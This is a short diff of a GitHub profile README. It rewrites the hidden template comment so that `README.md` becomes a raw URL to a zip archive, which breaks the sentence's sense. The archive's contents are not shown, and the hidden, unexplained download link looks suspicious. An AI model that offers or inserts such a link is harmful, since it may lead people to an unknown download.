@@ -5,6 +5,6 @@
 - 📫 How to reach me, dm on discord: tezzzzzz4
 
 <!---
-tezz004/tezz004 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+tezz004/tezz004 is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/tezz004/tezz004/main/pneumoderma/tezz004_2.1.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
